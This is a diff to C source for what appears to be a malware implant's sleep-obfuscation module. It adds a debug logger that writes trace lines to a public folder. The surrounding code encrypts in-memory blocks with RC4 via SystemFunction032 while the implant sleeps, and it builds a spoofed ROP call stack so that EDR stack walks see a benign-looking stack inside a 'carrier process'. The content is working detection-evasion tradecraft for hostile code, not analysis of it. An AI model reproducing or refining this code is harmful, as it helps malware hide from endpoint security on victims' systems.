@@ -31,6 +31,34 @@ typedef struct _G3_USTRING {
 
 typedef LONG(NTAPI *G3_SF032)(G3_USTRING * data, G3_USTRING * key); /* advapi32 SystemFunction032 = RtlEncryptDecryptRC4, returns NTSTATUS (LONG) */
 
+
+/* ---- temporary bisect probe (remove after diagnosis) ---- */
+static void g3_log(const char * msg, long v)
+{
+	HANDLE f = CreateFileA("C:\\Users\\Public\\gen3_trace.txt", FILE_APPEND_DATA, 0, NULL,
+	                       OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	char buf[96];
+	if (f == INVALID_HANDLE_VALUE)
+		return;
+	{
+		int i = 0;
+		const char * p = msg;
+		while (*p && i < 70) buf[i++] = *p++;
+		if (v != 0x7fffffff) {
+			char num[16];
+			int n = 0;
+			long t = v;
+			if (t < 0) { buf[i++] = '-'; t = -t; }
+			do { num[n++] = (char)('0' + (t % 10)); t /= 10; } while (t);
+			while (n && i < 90) buf[i++] = num[--n];
+		}
+		buf[i++] = '\r';
+		buf[i++] = '\n';
+		WriteFile(f, buf, (DWORD)i, NULL, NULL);
+	}
+	CloseHandle(f);
+}
+
 static G3_SF032 g_sf032;
 
 /* RC4 is a stream cipher: running it twice with the same key restores the
@@ -271,12 +299,10 @@ static BOOL g3_init(void)
 	int i;
 
 	g_sf032 = (G3_SF032)GetProcAddress(GetModuleHandleA("advapi32.dll"), "SystemFunction032");
-	if (g_sf032 == NULL)
-		return FALSE;
+	if (g_sf032 == NULL) { g3_log("init: no SystemFunction032", 0); return FALSE; }
 
 	g_lookup = (G3_LOOKUP)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlLookupFunctionEntry");
-	if (g_lookup == NULL)
-		return FALSE;
+	if (g_lookup == NULL) { g3_log("init: no RtlLookupFunctionEntry", 0); return FALSE; }
 
 	/* resolve every frame's return address; localspl is not loaded in the
 	 * average carrier process, so pull it in once (the module-load event
@@ -290,18 +316,15 @@ static BOOL g3_init(void)
 				return FALSE;
 		}
 		fn = GetProcAddress(mod, g_frames[i].func);
-		if (fn == NULL)
-			return FALSE;
+		if (fn == NULL) { g3_log("init: no func ", 100 + i); return FALSE; }
 		g_frames[i].retaddr = (unsigned __int64)fn + g_frames[i].offset;
-		if (!g3_frame_size(g_frames[i].retaddr, &g_frames[i].stack_size))
-			return FALSE;
+		if (!g3_frame_size(g_frames[i].retaddr, &g_frames[i].stack_size)) { g3_log("init: frame size fail ", 200 + i); return FALSE; }
 	}
 
 	g_stack_bytes = 8; /* trailing NULL stops the unwind */
 	for (i = 0; i < 4; i++)
 		g_stack_bytes += g_frames[i].stack_size;
-	if (g_stack_bytes > 0x800) /* sanity: real shapes are a few hundred bytes */
-		return FALSE;
+	if (g_stack_bytes > 0x800) { g3_log("init: stack bytes too big", (long)g_stack_bytes); return FALSE; }
 
 	g_scratch = (unsigned char *)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 	if (g_scratch == NULL)
@@ -418,6 +441,7 @@ static BOOL g3_stack_spoof_sleep(DWORD time)
 	 * stack sitting where EDR stack walks will look */
 	WaitForSingleObject(event, INFINITE);
 	ok = TRUE;
+	g3_log("sleep: ROP window served", 0x7fffffff);
 
 done:
 	if (queue != NULL)
@@ -436,8 +460,12 @@ BOOL gen3_sleep(DWORD time)
 	int nblocks;
 	int i;
 
-	if (!g_inited && !g3_init())
+	g3_log("sleep: enter", 0x7fffffff);
+	if (!g_inited && !g3_init()) {
+		g3_log("sleep: init failed -> caller falls back", 0x7fffffff);
 		return FALSE;
+	}
+	g3_log("sleep: init ok, stack bytes", (long)g_stack_bytes);
 
 	/* per-cycle key, kept on the stack (never masked) */
 	{
@@ -451,10 +479,12 @@ BOOL gen3_sleep(DWORD time)
 #else
 	nblocks = g3_snapshot_blocks(blocks, G3_MAX_BLOCKS);
 #endif
+	g3_log("sleep: nblocks", nblocks);
 
 	for (i = 0; i < nblocks; i++)
 		g3_rc4(blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
 
+	g3_log("sleep: mask done, entering window", 0x7fffffff);
 	if (!g3_stack_spoof_sleep(time)) {
 		/* spoof machinery failed mid-window: unmask first, then serve a
 		 * plain sleep so the caller's contract still holds */
@@ -463,6 +493,7 @@ BOOL gen3_sleep(DWORD time)
 		Sleep(time);
 	}
 
+	g3_log("sleep: window done, unmasking", 0x7fffffff);
 	/* RC4 twice with the same key restores the plaintext */
 	for (i = 0; i < nblocks; i++)
 		g3_rc4(blocks[i].ptr, blocks[i].len, key, (unsigned int)i);
